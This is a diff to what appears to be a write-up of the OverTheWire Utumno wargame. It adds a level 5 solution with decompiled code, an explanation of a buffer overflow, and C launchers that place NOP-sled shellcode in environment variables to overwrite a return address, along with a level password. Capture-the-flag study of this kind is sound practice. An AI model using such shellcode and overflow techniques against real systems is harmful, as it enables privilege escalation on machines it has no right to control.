@@ -176,7 +176,11 @@ Finalize program to execute priviledge execution
       "JUNK",
       "JUNK",
       "JUNK",
-      "AAAABBBBCCCCDDDD\xa0\xdd\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
+      "AAAABBBBCCCCDDDD\xa0\xdd\xff\xff\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+			\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
+			\xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a
+			\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53
+			\x52\x54\x8a\xe2\xce\x81",
       NULL
     };
     execve("/utumno/utumno2", args, envp);
@@ -294,8 +298,6 @@ Program received signal SIGSEGV, Segmentation fault.
 Now we can create an environment var or buffer, with exploit and overwrite the return address to 
 point to the shellcode.
 
-perl -e 'print "\x41"x . "\x90"x200 . "" . "\x\x\x\x" '
-
 $ export EXPLOIT=$(perl -e 'print "\x90"x100 . "\xeb\x11\x5e\x31\xc9\xb1\x21\x80\x6c\x0e\xff\x01\x80
   \xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b\x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b
 	\x69\x69\x30\x63\x62\x74\x69\x30\x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81"')
@@ -307,6 +309,80 @@ $ ./utumno4 65536 $(perl -e 'print "\x41"x65286 . "\x50\xd5\xff\xff"x4 . "\x43"x
 ###################################################################################################
 
 Level:    5
+Exploit:  buffer overflow
+Password: aGlKWrixsh
+
+Decompiling the binary roughly shows the following:
+	int main(int argc,char **argv) {
+		if ((argc != 0) && ((argc != 1 || (**argv != '\0')))) {
+			puts("Aw..");
+											/* WARNING: Subroutine does not return */
+			exit(1);
+		}
+		printf("Here we go - %s\n", argv[10]); <-- segfaults
+		hihi(argv[10]);
+		return 0;
+	}
+
+Must bypass the initial conditions. Use the previous method of invoking the binary from another 
+program with no args. program printf with argv[10]. This is equivalent to 9th environment var.
+#include <unistd.h>
+int main() {
+        char *args[] = { NULL };
+        char *envp[] = { 
+                "AAAA",
+								...
+                "",  <-- envp[8] associates to argv[10]
+                NULL };
+        execve("/utumno/utumno5", args, envp);
+        return 0;
+}
+
+Decompiling hihi function:
+void hihi(const char *input) {
+    char buffer[12];
+    if (strlen(input) > 19) {
+        strncpy(buffer, input, 20);    <-- Use this to overwrite return address
+    } else {
+        strcpy(buffer, input);
+    }
+}
+A buffer overflow occurs inside of hihi from argv[10] or envp[9]. We can modify the return address
+to point to environment variable which holds exploit.
+
+I find exploit environment variable address at: 0xffffdf3b ~ 0xffffdf40
+
+The final program which gives immediate priviledge escalation
+#include <unistd.h>
+int main() {
+        char *args[] = { NULL };
+        char *envp[] = { 
+                "AAAA",
+                "BBBB",
+                "CCCC",
+                "DDDD",
+                "EEEE",
+                "FFFF",
+                "AAAA",
+                "BBBB",
+                "AAAABBBBCCCCDDDD\x40\xdf\xff\xff",
+                "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
+                 \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x11\x5e\x31\xc9
+                 \xb1\x21\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x6b
+                 \x0c\x59\x9a\x53\x67\x69\x2e\x71\x8a\xe2\x53\x6b\x69\x69\x30\x63\x62\x74\x69\x30
+                 \x63\x6a\x6f\x8a\xe4\x53\x52\x54\x8a\xe2\xce\x81",
+                NULL };
+        execve("/utumno/utumno5", args, envp);
+        return 0;
+}
+
+###################################################################################################
+
+Level:    6
 Exploit:  
 Password: 
 
